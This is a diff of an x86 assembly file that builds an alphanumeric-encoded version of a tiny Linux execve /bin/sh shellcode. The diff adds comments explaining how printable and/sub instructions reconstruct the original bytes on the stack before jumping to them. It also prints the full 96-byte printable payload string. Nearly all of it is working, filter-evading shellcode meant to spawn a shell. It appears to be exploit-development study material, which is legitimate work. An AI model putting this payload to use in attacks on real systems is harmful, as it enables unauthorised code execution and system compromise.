@@ -1,5 +1,6 @@
-; Original shellcode (Linux/x86 - Tiny Execve sh Shellcode - 21 bytes by Geyslan G. Bem): http://shell-storm.org/shellcode/files/shellcode-841.php
+; Author: Martí Guasch Jiménez
 
+; Original shellcode (Linux/x86 - Tiny Execve sh Shellcode - 21 bytes by Geyslan G. Bem): http://shell-storm.org/shellcode/files/shellcode-841.php
 ;  0:    31 c9                    xor    ecx, ecx
 ;  2:    f7 e1                    mul    ecx
 ;  4:    b0 0b                    mov    al, 0xb
@@ -9,48 +10,54 @@
 ; 11:    89 e3                    mov    ebx, esp
 ; 13:    cd 80                    int    0x80
 
-; Final length 96 bytes
+; Modified shellcode (96 bytes)
+; "%JMNU%521*-$/=+-0ov'-#~~,Ph/binh/shh%JMNU%521*-_$@>-`*%"-6`2pP%JMNU%521*-AG~a-xG$o-~y{~PhAIA1T" + "\xc3"(ret non-printable)
+; We generate the shellcode in the stack and then jump to it.
+
 bits 32
 
-;80cde389
+; Set eax to zero
 and eax, 0x554e4d4a
 and eax, 0x2a313235
 
+; Creates 0x80cde389 in eax
 sub eax, 0x2b3d2f24
 sub eax, 0x27766f30
 sub eax, 0x2c7e7e23
 
 push eax
 
-;6e69622f
+; 0x6e69622f
 push 0x6e69622f
 
-;6868732f
+; 0x6868732f
 push 0x6868732f
 
-;2f68510b
+; Set eax to zero
 and eax, 0x554e4d4a
 and eax, 0x2a313235
 
+; Creates 0x2f68510b in eax
 sub eax, 0x3e40245f
 sub eax, 0x22252a60
 sub eax, 0x70326036
 
 push eax
 
-;b0e1f7c9
+; Set eax to zero
 and eax, 0x554e4d4a
 and eax, 0x2a313235
 
+; Creates 0xb0e1f7c9 in eax
 sub eax, 0x617e4741
 sub eax, 0x6f244778
 sub eax, 0x7e7b797e
 
 push eax
 
-;31414941
+; 0x31414941
 push 0x31414941
 
-; jmp to shellcode (1 non-printable byte :( )
+; Jump to shellcode
 push esp
-ret
+ret ; \xc3 [!]
